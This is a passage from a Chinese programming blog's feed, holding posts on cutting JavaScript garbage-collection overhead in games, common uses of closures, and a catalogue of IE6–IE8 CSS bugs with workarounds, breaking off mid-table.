class="line"></span><br><span class="line"><span class="comment">// in the tick() function</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="variable language_">this</span>.<span class="property">tickFunc</span>, <span class="number">16</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>　　相比于每次都新建一个方法对象，这种方式在每一帧当中重用了相同的方法对象。这种方式的优势是显而易见的，而这种思想也可以应用在任何以方法为返回值或者在运行时创建方法的情况当中。</p><p><strong>4、高级技术</strong></p><p>　　从根本上来说，javascript本身就是围绕着垃圾收集来设计的。随着我们工作的进行，避免内存垃圾变得越来越困难。因为很多方便实用的Javascript库方法也会产生一些新的对象。对于这些库方法产生的垃圾，我们束手无策，只能重新翻看文档，并且检查方法的返回值。例如，数组的slice方法返回一个新的数组（在不修改原数组的基础上，截取出一部分作为新数组），字符串的substr方法返回一个新的字符串（在不修改原字符串的基础上，截取出一部分字符串作为返回值）等等。</p><p>　　调用这些库方法，将会创建内存垃圾，而你能做的，只有避免调用这些方法，或者用不创建系统垃圾的方式重写这些方法（有点极端啦~）。</p><p>　　例如，在Construct 2引擎中，从数组中利用下标来删除一个元素，是经常进行的操作。最初我们是用下面这种方式来实现的：</p><div><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sliced = arr.<span class="built_in">slice</span>(index + <span class="number">1</span>);</span><br><span class="line">arr.<span class="built_in">length</span> = index;</span><br><span class="line">arr.<span class="built_in">push</span>.apply(arr, sliced);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>　　然而，slice方法会返回一个新的数组对象（数组中的元素是原数组中删掉的部分），并且会通过arr.push.apply方法将元素重新复制回原数组，但是在此操作之后，该数组就成为了一片内存垃圾。由于这是我们引擎中的垃圾产生的热点代码（使用频率非常很高），因此我们利用了迭代的方式重写了上述代码：</p><div><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">for (<span class="built_in">var</span> i = <span class="built_in">index</span>, <span class="built_in">len</span> = arr.length – <span class="number">1</span>; i &lt; <span class="built_in">len</span>; i++)</span><br><span class="line">    arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">arr.length = <span class="built_in">len</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>　　显然，重写大量的库函数是非常痛苦的，因此你必须仔细权衡方法的易用性和内存垃圾产生情况。如果产生大量内存垃圾的方法在动画的每一帧中被多次调用，你可能就会兴高采烈的重写库函数啦。</p><p>　　在递归函数中，通过{}构造空对象，并在递归过程中传递数据，虽然是很方便的。但是更好的方式是：利用一个单独的数组对象作为堆栈，在递归过程中对数组进行push和pop操作。更进一步，不要调用array的pop方法（pop将会使得array的最后一个元素将会变成内存垃圾），而应该使用一个索引来记录数组的最后一个元素的位置，在pop时简单的将索引减一即可；类似的，将索引加1来代替array的push操作，只有当索引对应的元素不存在时，才执行真正的push为数组加入一个新元素。</p><p>　　另外，在任何时候，都应该避免使用向量对象（例如：包含x和y属性的vector2对象）。有些方法将向量对象作为方法返回值，既可以支持返回值的再次修改，又能够将需要的属性一次性返回，使用起来非常方便。但是有时候在一帧动画中，创建了成百上千个这样的向量对象，从而导致严重的垃圾回收性能问题，也是非常常见的。因此最好将这些方法分离成具有独立职责的功能个体，例如：利用getX()和getY()方法（返回具体数据）代替getPosition()方法（返回一个vector2对象）。</p><p><strong>四、总结</strong></p><p>　　在Javascript中，彻底避免垃圾回收是非常困难的。垃圾回收机制与实时软件（例如：游戏）的实时性要求，从根本上就是对立的。</p><p>　　但是，为了减少内存垃圾，我们还是可以对javascript代码进行彻底检查，有些代码中存在明显的产生过多内存垃圾的问题代码，这些正是我们需要检查并且完善的。</p><p>　　我认为，只要我们投入更多的精力和关注，实现实时的、低垃圾收集的javascript应用还是很有可能的。毕竟，对于可交互性要求较高的游戏或应用来说，实时性和低垃圾收集，两者都是至关重要。</p><p><strong>五、参考资料</strong></p><p><strong>　　</strong>1.&nbsp;<a href="http://fed.renren.com/archives/605#more-605" target="_blank">人人FED</a></p><p>　　2.&nbsp;<a href="http://www.cnblogs.com/jeffwongishandsome/archive/2009/05/17/1458405.html" target="_blank">Jeff Wong</a></p><p>　　3. 《JavaScript权威指南(第四版)》</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 垃圾回收 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS闭包的用途</title>
      <link href="/blog/2013/04/24/cb-javascript-closure-usages/"/>
      <url>/blog/2013/04/24/cb-javascript-closure-usages/</url>
      
        <content type="html"><![CDATA[<p>我们来看看闭包的用途。事实上，通过使用闭包，我们可以做很多事情。比如模拟面向对象的代码风格；更优雅，更简洁的表达出代码；在某些方面提升代码的执行效率。</p><p><strong>1. 匿名自执行函数</strong></p><p>我们知道所有的变量，如果不加上var关键字，则默认的会添加到全局对象的属性上去，这样的临时变量加入全局对象有很多坏处，比如：别的函数可能误用这些变量；造成全局对象过于庞大，影响访问速度(因为变量的取值是需要从原型链上遍历的)。除了每次使用变量都是用var关键字外，我们在实际情况下经常遇到这样一种情况，即有的函数只需要执行一次，其内部变量无需维护，比如UI的初始化，那么我们可以使用闭包：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">var datamodel = &#123;</span><br><span class="line">    <span class="keyword">table</span> : [],</span><br><span class="line">    tree : &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(dm)&#123;</span><br><span class="line">    <span class="keyword">for</span>(var i = <span class="number">0</span>; i &lt; dm.<span class="keyword">table</span>.<span class="keyword">rows</span>; i++)&#123;</span><br><span class="line">       var <span class="keyword">row</span> = dm.<span class="keyword">table</span>.<span class="keyword">rows</span>[i];</span><br><span class="line">       <span class="keyword">for</span>(var j = <span class="number">0</span>; j &lt; <span class="keyword">row</span>.cells; i++)&#123;</span><br><span class="line">           drawCell(i, j);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //build dm.tree    </span><br><span class="line">&#125;)(datamodel); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们创建了一个匿名的函数，并立即执行它，由于外部无法引用它内部的变量，因此在执行完后很快就会被释放，关键是这种机制不会污染全局对象。<strong>2.缓存</strong></p><p>再来看一个例子，设想我们有一个处理过程很耗时的函数对象，每次调用都会花费很长时间，那么我们就需要将计算出来的值存储起来，当调用这个函数的时候，首先在缓存中查找，如果找不到，则进行计算，然后更新缓存并返回值，如果找到了，直接返回查找到的值即可。闭包正是可以做到这一点，因为它不会释放外部的引用，从而函数内部的值可以得以保留。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> CachedSearchBox = (<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span><br><span class="line">    <span class="keyword">var</span> cache = &#123;&#125;,  </span><br><span class="line">       <span class="built_in">count</span> = [];  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">       <span class="attr">attachSearchBox</span> : <span class="keyword">function</span>(<span class="params">dsid</span>)&#123;  </span><br><span class="line">           <span class="keyword">if</span>(dsid in cache)&#123;<span class="comment">//如果结果在缓存中  </span></span><br><span class="line">              <span class="keyword">return</span> cache[dsid];<span class="comment">//直接返回缓存中的对象  </span></span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="keyword">var</span> fsb = <span class="keyword">new</span> uikit.webctrl.SearchBox(dsid);<span class="comment">//新建  </span></span><br><span class="line">           cache[dsid] = fsb;<span class="comment">//更新缓存  </span></span><br><span class="line">           <span class="keyword">if</span>(<span class="built_in">count</span>.<span class="built_in">length</span> &gt; <span class="number">100</span>)&#123;<span class="comment">//保正缓存的大小&lt;=100  </span></span><br><span class="line">              delete cache[<span class="built_in">count</span>.shift()];  </span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="keyword">return</span> fsb;        </span><br><span class="line">       &#125;,  </span><br><span class="line">   </span><br><span class="line">       <span class="attr">clearSearchBox</span> : <span class="keyword">function</span>(<span class="params">dsid</span>)&#123;  </span><br><span class="line">           <span class="keyword">if</span>(dsid in cache)&#123;  </span><br><span class="line">              cache[dsid].clearSelection();    </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;)();  </span><br></pre></td></tr></table></figure><p>CachedSearchBox.attachSearchBox(“input1”);  </p><p>这样，当我们第二次调用CachedSearchBox.attachSerachBox(\input1")的时候，我们就可以从缓存中取道该对象，而不用再去创建一个新的searchbox对象。<strong>3.实现封装</strong></p><p>可以先来看一个关于封装的例子，在person之外的地方无法访问其内部的变量，而通过提供闭包的形式来访问：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//变量作用域为函数内部，外部无法访问  </span></span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;default&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">       getName : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> name;</span><br><span class="line">       &#125;,</span><br><span class="line">       setName : <span class="function"><span class="keyword">function</span>(<span class="params">newName</span>)</span>&#123;</span><br><span class="line">           name = newName;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(person.name);<span class="comment">//直接访问，结果为undefined  </span></span><br><span class="line"><span class="keyword">print</span>(person.<span class="title function_ invoke__">getName</span>());</span><br><span class="line">person.<span class="title function_ invoke__">setName</span>(<span class="string">&quot;abruzzi&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(person.<span class="title function_ invoke__">getName</span>());</span><br><span class="line"></span><br><span class="line">得到结果如下：</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line"><span class="keyword">default</span></span><br><span class="line">abruzzi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4. 闭包的另一个重要用途是实现面向对象中的对象，传统的对象语言都提供类的模板机制</strong>这样不同的对象(类的实例)拥有独立的成员及状态，互不干涉。虽然JavaScript中没有类这样的机制，但是通过使用闭包，我们可以模拟出这样的机制。还是以上边的例子来讲：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;default&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">       getName : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> name;</span><br><span class="line">       &#125;,</span><br><span class="line">       setName : <span class="function"><span class="keyword">function</span>(<span class="params">newName</span>)</span>&#123;</span><br><span class="line">           name = newName;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> john = <span class="title function_ invoke__">Person</span>();</span><br><span class="line"><span class="keyword">print</span>(john.<span class="title function_ invoke__">getName</span>());</span><br><span class="line">john.<span class="title function_ invoke__">setName</span>(<span class="string">&quot;john&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(john.<span class="title function_ invoke__">getName</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jack = <span class="title function_ invoke__">Person</span>();</span><br><span class="line"><span class="keyword">print</span>(jack.<span class="title function_ invoke__">getName</span>());</span><br><span class="line">jack.<span class="title function_ invoke__">setName</span>(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(jack.<span class="title function_ invoke__">getName</span>());</span><br><span class="line"></span><br><span class="line">运行结果如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span></span><br><span class="line">john</span><br><span class="line"><span class="keyword">default</span></span><br><span class="line">jack</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此代码可知，john和jack都可以称为是Person这个类的实例，因为这两个实例对name这个成员的访问是独立的，互不影响的。</p><p>当然，除此之外，从不同的角度来看待闭包，他的作用也可以有不同的说法。</p><ul><li>闭包可以防止变量重名，保证变量不污染全局</li><li>闭包可以创建私有变量和私有方法</li><li>闭包可以....</li></ul><p>本文参考：<a href="http://blog.csdn.net/sunlylorn/article/details/6534610" target="_blank">sunlylorn的专栏</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> JavaScript闭包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IE6 bug集</title>
      <link href="/blog/2013/04/24/cb-ie6-bugs/"/>
      <url>/blog/2013/04/24/cb-ie6-bugs/</url>
      
        <content type="html"><![CDATA[<p><strong>1.IE6的3像素偏移BUG</strong>&nbsp;&nbsp;&nbsp; 当浮动元素与非浮动元素相邻（注意这里的相邻可以是纵向的也可以是横向的）时，这个3像素的Bug就会出现，它会偏移3像素。实际表现就是两个元素之间产生了一道缝隙！解决方法很简单，将两个元素都浮动就OK了。此BUG深层的原因是非浮动元素的layout未触发，所以这里只要是能够触发layout的css都可以解决问题。</p><p><strong>2.IE6 双倍边距问题</strong>&nbsp;&nbsp;&nbsp; 当浮动元素设置margin边距时，边距会加倍。解决方法是给浮动元素加上display：inline属性。</p><p><strong>3.IE6下空标签高度问题</strong>&nbsp;&nbsp;&nbsp; 当你把标签的高度设置为0-19内的数字时，IE6会一致的显示为19px高。解决方法：给标签加上overflow：hidden。</p><p><strong>4.IE6图片下方有空隙产生</strong><span>&nbsp; &nbsp;css代码：</span></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">background</span>:orange;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">276px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">110px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span>HTML代码：</span></pre><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;....&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;google&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre>解决办法是：img｛display：block；}<span><strong>5.IE6,7失效的margin-left/right bug</strong></span><span>HTML代码：</span></pre><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;cont&quot;</span>&gt;www.hemin.cn&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span>CSS代码：</span></pre><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">wrap&#123;<span class="attribute">background</span>:<span class="number">#eee</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;&#125;</span><br><span class="line">cont&#123;<span class="attribute">border-bottom</span>:<span class="number">2px</span> solid <span class="number">#aaa</span>;<span class="attribute">margin</span>:<span class="number">0</span> <span class="number">100px</span>;<span class="attribute">height</span>:<span class="number">30px</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span>解决方法：触发.warp的layout就可以了。具体的比如：给.warp加上zoom:1或者width等等。</span><span><strong>6. IE6 幽灵文本(Ghost Text bug)</strong></span>在我写本文之前，我遇到了这个bug。它相当的古怪和滑稽。一块不知哪来的重复的文本，被IE6显示在靠近原文本的下面。(译注：也可以参看<a href="http://www.positioniseverything.net/explorer/dup-characters.html" target="_blank">Explorer 6 Duplicate Characters Bug</a>获得bug演示)。我无法解决它，所以我搜索它，果然，这是另一个IE6的bug。对此有许多解决方法，但是没有一个对我的例子有效(因为网站的复杂性我无法使用其中的一些方法)。所以我使用了hack。在原文本之后增加空格看起来能解决这个问题。但是，从<a href="http://hippytechblog.blogspot.com/2009/07/ie6-ghost-text-bug.html" target="_blank">Hippy Tech Blog</a>那里了解到，问题背后的原因是由于html注释标签。IE6不能正确的渲染它。下面是他建议的解决方案列表：</pre><ol><li>使用&lt;!&mdash;[IF !IE]&gt;标签包围注释</li><li>移除注释</li><li>在前浮动上增加样式 {display:inline;}</li><li>在适当的浮动的div上使用负边距</li><li>在原文本增加额外的<nbsp;(比如10个空格) (hacky way)</li></ol><pre><span><strong>7. 相对位置和溢出隐藏(Position Relative and Overflow Hidden)</strong></span>这个问题我遇到过很多次，当时我正在准备一个JQuery的教程，因为我使用了很多overflow hidden来达到我想要的布局。问题发生在当父元素的overflow被设置成hidden并且子元素被设置成position:relative。CSS-Trick有一个很好的例子来演示这个bug。<a href="http://snook.ca/archives/html_and_css/position_relative_overflow_ie/" target="_blank">position:relative and overflow in internet explorer</a><em>解决方法</em>为父元素增加position:relative;<span><strong>8. IE的最小高度(Min-Height for IE)</strong></span>这很简单，IE忽略min-height属性。你可以用下面的hack来修复它。感谢<a href="http://www.dustindiaz.com/min-height-fast-hack/" target="_blank">Dustin Diaz</a>。这个解决方法在IE6, Mozilla/Firefox/Gecko, Opera 7.x+, Safari1.2里都工作的很好。<em>解决方法</em></pre><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">selector &#123;</span><br><span class="line">   <span class="attribute">min-height</span>:<span class="number">500px</span>;</span><br><span class="line">   <span class="attribute">height</span>:auto <span class="meta">!important</span>;</span><br><span class="line">   <span class="attribute">height</span>:<span class="number">500px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span><strong>9. Bicubic图像缩放(Bicubic Image Scaling)</strong></span>你会喜欢这个的。IE那糟糕图像缩放让你很困扰？如果你拿IE和其他浏览器比较，IE缩小的图像看起来不如其他浏览器。</pre><p><img src="https://pic002.cnblogs.com/img/lw19870811/201007/2010072616324250.gif" alt=""></p><pre><em>解决方法</em></pre><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123; -ms-interpolation-mode: bicubic;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><strong>10.PNG透明(PNG Transparency)</strong></pre><pre>我猜每个人都知道这个，但我仍把它列在这里，作为以后的参考。</pre><pre>所以如果你想要使用透明图像并且GIF不能给你想要的质量，你会需要这个对PNG的hack。你必须意识到，如果你使用一张PNG图像作为背景，你将不能设置背景的位置。<em>解决方法</em><em>&nbsp;</em></pre><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="built_in">AlphaImageLoader</span>(...);</span><br><span class="line">｝</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span></span><strong>11. IFrame透明背景 (IFrame Transparent Background)</strong></pre><pre>在firefox和safari里你应该不会遇到这个问题因为默认情况下，iframe的背景被设置为transparent，但是在IE里，却不是如此。你需要用到allowTransparency 属性并且加入下面的CSS代码来达成目的。<em>解决方法</em></pre><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* in the iframe element */</span></span><br><span class="line">&lt;<span class="selector-tag">iframe</span> <span class="attribute">src</span>=<span class="string">&quot;content.html&quot;</span> allowtransparency=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* in the iframe docuement, in this case content.html */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>:transparent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><strong>12. 禁用IE默认的垂直滚动条(Disabled IE default Vertical Scroll bar)</strong></pre><pre>默认情况下，即使内容适合窗口大小，IE(译注：IE6/7)也会显示垂直滚动条。你可以使用overflow:auto，让滚动条只在你需要时出现。<em></em><span><strong>13. :hover伪类(:hover Pseudo Class)</strong></span>IE只支持&lt;a&gt;元素的 :hover伪类。你可以使用jQuery的hover event来达到相同效果。<em></em></pre><pre><strong>14. 盒模型Hack(Box Hack Model)</strong></pre><pre>这是IE里最热门的bug了。基本的理解是，IE计算宽度(width)的方式不同。基于w3c标准，一个元素总宽度应该是总宽度 = margin-left + border-left + padding-left + width + padding-right + border-right + margin-right但是，IE计算宽度时没有加上填充和边框：总宽度 = margin-left + width + margin-right更多的细节，请参考这个链接：<a href="http://www.456bereastreet.com/archive/200612/internet_explorer_and_the_css_box_model/" target="_blank">Internet Explorer和CSS盒模型详细解释</a><em>解决方法</em>使用w3c的标准兼容模式。IE6或者之后的版本能基于w3c的标准计算，但是你仍旧会在IE5中遇到问题。或者你可以用CSS Hack来解决这个问题。所有标准兼容的浏览器都能读取w\\idth:180px 除了IE5。</pre><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#content</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">1px</span> solid;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">    w\\idth:<span class="number">180px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span><strong>15.IE bug</strong></span>（摘自：<a href="http://www.iwanna.cn/archives/2010/07/29/4780/">http://www.iwanna.cn/archives/2010/07/29/4780/</a>）</pre><table><thead><tr><th width="30">&nbsp;</th><th width="120">问题</th><th width="60">浏览器</th><th width="90">DEMO</th><th width="120">解决方法</th></tr><tr><td colspan="5"><strong>Hacking Rules:&nbsp;</strong>property:all-<a class="st_tag internal_tag" title="Posts tagged with IE" href="http://www.iwanna.cn/tags/ie/" rel="tag nofollow">ie</a>\9; property:gte-ie8\0;*property:lte-ie7; +property:ie7; _property:ie6;</td></tr></thead><tbody><tr><td>1</td><td>input[button | submit] 不能用 margin:0 auto; 居中</td><td>IE8</td><td><a href="http://haslayout.net/demos/No-Auto-Margin-Center-on-Buttons-Inconsistency-Demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/No-Auto-Margin-Center-on-Buttons-Inconsistency-Fixed-Demo-CS.html" target="_blank">fixed</a></td><td>为input添加width</td></tr><tr><td>2</td><td>body{overflow:hidden;}没有去掉滚动条</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/Document-Scrollbars-Overflow-Inconsistency-Demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/Document-Scrollbars-Overflow-Inconsistency-Fixed-Demo.html" target="_blank">fixed</a></td><td>设置html{overflow:hidden;}</td></tr><tr><td>3</td><td>hasLayout的标签拥有高度</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/Empty-Element-Height-Bug-Demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/Empty-Element-Height-Bug-Fixed-Demo.html" target="_blank">fixed</a></td><td>*height:0;_overflow:hidden;</td></tr><tr><td>4</td><td>form&gt;[hasLayout]元素有margin-left时，子元素中的[input | textarea] 出现2×margin-left</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/Form-Control-Double-Margin-Bug-Demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/Form-Control-Double-Margin-Bug-Fixed-Demo.html" target="_blank">fixed</a></td><td>form &gt; [hasLayout 元素]{margin-left:宽度;}form div{*margin-left:宽度&divide;2;}</td></tr><tr><td>5</td><td>当border-width有1条&lt;边3条时被设置成dotted时，1px的边dotted显示成dashed</td><td>IE7</td><td><a href="http://haslayout.net/demos/IE7-1px-Dotted-Border-Appears-As-Dashed-Bug-Demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/IE7-1px-Dotted-Border-Appears-As-Dashed-Bug-Fixed-Demo.html" target="_blank">fixed</a></td><td>不在同一个元素上使用不同宽度的 dotted</td></tr><tr><td>6</td><td>当子元素有position:relative的时候，父元素设置overflow:[hidden|auto]相当于给子元素设置了position:visible;</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/relative-overflow-failure-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/relative-overflow-failure-bug-demo-fixed.html" target="_blank">fixed</a></td><td>给父元素设置position:relative;</td></tr><tr><td>7</td><td>:hover伪类不能改变有position:absolute的子级元素的left/top值</td><td>IE7</td><td><a href="http://haslayout.net/demos/ie7-broken-hover-absolute-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/ie7-broken-hover-absolute-bug-demo-fixed.html" target="_blank">fixed</a></td><td>把top/left的值设置成除0%外的所有百分值；或添加一个margin-[所有方向]除0外的所有值，包括0%</td></tr><tr><td>8</td><td>:focus + selector {} 选择器失效</td><td>IE8</td><td><a href="http://haslayout.net/demos/ignored-focus-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/ignored-focus-bug-demo-fixed.html" target="_blank">fixed</a></td><td>在失效选择器后面添加一个空选择器, :focus{}</td></tr><tr><td>9</td><td>列表中混乱的浮动：在list中浮动图片时，图片出现溢出正常位置；或没有list-style</td><td>IE8</td><td><a href="http://haslayout.net/demos/image-float-bullet-chaos-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/image-float-bullet-chaos-demo-fixed.html" target="_blank">fixed</a></td><td>用背景图片替换list-style</td></tr><tr><td>10</td><td>th 不会自动继承上级元素的 text-align</td><td>IE8</td><td><a href="http://haslayout.net/demos/non-inherited-th-text-align-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/non-inherited-th-text-align-bug-demo-fixed.html" target="_blank">fixed</a></td><td>给th添加text-align:inherit; (base.<a class="st_tag internal_tag" title="Posts tagged with CSS" href="http://www.iwanna.cn/tags/css/" rel="tag nofollow">css</a>中已包含)</td></tr><tr><td>11</td><td>样式(包括link/style/@import(link)) 最多允许个为是：32</td><td>IE6-8</td><td>─ 常识</td><td>99.99%的情况下，不会遇到</td></tr><tr><td>12</td><td>:hover 时若background-color为#fff, 失效</td><td>IE7</td><td><a href="http://haslayout.net/demos/hover-white-background-ignore-bug.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/hover-white-background-ignore-bug-fixed-demo.html" target="_blank">fixed</a></td><td>把background-color改成background。或者，非#fff || #ffffff</td></tr><tr><td>13</td><td>忽略"&gt;"后有注释的选择器：selector&gt; /**/ selector{}</td><td>IE6</td><td><a href="http://haslayout.net/demos/ie7-child-selector-comment-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/ie7-child-selector-comment-bug-demo.html" target="_blank">fixed</a></td><td>[<a href="http://haslayout.net/css/IE7-Child-Selector-Comment-Bug" target="_blank">官方误判</a>] 这个bug是IE6 BUG</td></tr><tr><td>14</td><td>* html</td><td>IE6</td><td>─ HACK</td><td>只对IE6有效</td></tr><tr><td>15</td><td>PNG图片中的颜色和背景颜色的值相同，但显示不同</td><td>IE6-7</td><td><a href="http://haslayout.net/demos/png-color-mismatch-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/png-color-mismatch-demo-fixed.html" target="_blank">fixed</a></td><td>利用&nbsp;<a href="http://pmt.sourceforge.net/pngcrush/" target="_blank">pngcrush</a>&nbsp;去除图片中的 Gamma profiles</td></tr><tr><td>16</td><td>margin:0 auto; 不能让block元素水平居中</td><td>IE6-8</td><td><a href="http://haslayout.net/demos/no-auto-margin-center-pseudo-bug-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/no-auto-margin-center-pseudo-bug-demo-fixed.html" target="_blank">fixed</a></td><td>给block元素添加一个width</td></tr><tr><td>17</td><td>使用伪类 :first-line | :first-letter, 属性的值中出现!important 会使属性失效</td><td>IE8</td><td><a href="http://haslayout.net/demos/ie8-first-line-important-bug.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/ie8-first-line-important-bug-fixed.html" target="_blank">fixed</a></td><td>!important is evil, don"t use it anymore</td></tr><tr><td>18</td><td>:first-letter 失效</td><td>IE6</td><td><a href="http://haslayout.net/demos/ie6-first-letter-ignore-bug.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/ie6-first-letter-ignore-bug-fixed.html" target="_blank">fixed</a></td><td>把 :first-letter 移到离{}最近的地方，如 h1, p:first-letter{}，而非 p:first-letter h1{}</td></tr><tr><td>19</td><td>Position:absolute元素中，a display:block, 在非:hover时只有文本可点击</td><td>IE6/7</td><td><a href="http://haslayout.net/demos/partial-click-v2-demo.html" target="_blank">bug</a>&nbsp;|&nbsp;<a href="http://haslayout.net/demos/partial-click-v2-demo-fixed.html" 